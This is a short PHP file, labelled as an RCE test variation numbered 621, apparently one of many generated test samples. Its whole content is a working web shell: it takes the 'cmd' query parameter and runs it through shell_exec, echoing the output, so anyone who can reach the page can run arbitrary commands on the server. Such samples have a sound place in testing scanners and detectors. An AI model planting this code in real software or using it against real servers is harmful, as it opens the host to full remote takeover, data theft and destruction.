<?php
// RCE test variation #621
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>